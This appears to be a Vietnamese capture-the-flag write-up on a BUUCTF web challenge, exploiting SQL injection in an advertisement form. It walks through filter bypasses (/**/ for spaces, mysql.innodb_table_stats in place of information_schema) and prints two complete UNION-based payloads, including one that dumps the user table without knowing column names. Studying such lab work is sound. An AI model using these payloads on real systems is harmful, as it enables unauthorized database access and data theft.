![image](https://github.com/Llam-a/BUUCTF/assets/115911041/ebe19333-e331-4f5e-96fe-3690980d6bf8)

Challenge cho ta form login và register. Thử register sau đó login xem có gì hay ko.

Sau khi login thì nó có 2 path là logout, login và apply to advertise.Mình thử vào apply xem.

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/2243ad05-03a7-47dd-ac53-5dd75000064f)

Nó cho ta một form để điền để apply gồm `name advertisement` và content của cái advertise ta sẽ điền.

Mình thử test với `1'`.Thì xuất hiện lỗi sqli

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/bfa7d958-da1d-4acb-9057-7d0e8874b10f)

----->Query: `select ... from ... where $id = $input limit 0,1`

Sau đó thì thử với order by thì đã bị block rồi

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/4b41ad23-f64f-48f9-bf67-09fdc13d829f)

Fuzz một hồi thì đã bị block `space,or # --+`.Mình có thử /**/ thì thành công.Fuzz thì có 22 cột

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/e05abbfa-6227-4101-89e6-e29f295a5846)

Bấm cái nút cuối cùng bên phải thì

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/2a0e1c48-fc64-431a-adc9-f17ec058c2fe)

Vậy là lỗi ở cột 2 và 3.Tiếp tục tìm tên database

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f82b3207-db3d-45bb-9338-22c4f8f50903)

Vậy đã có tên database tiếp tục tìm table_name().Nhưng sau khi thử với `information_schema.schemata` thì bị block.Sau khi research thì có thể dùng `mysql.innodb_table_stats` để bypass

Payload:
`1'/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name="web1"'`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/903d1b95-836d-40e1-86cd-25365767fc90)

Có tablename rồi.Flag chắc chỉ ở user thôi.

Lúc này thì khá bị, tại không biết làm thế nào có thể lấy được data từ column nên có đọc ở đây

https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/

Payload:
`1'union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/user)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f4e46b9e-cdf3-45e4-9b9c-9cafaa22ff3a)




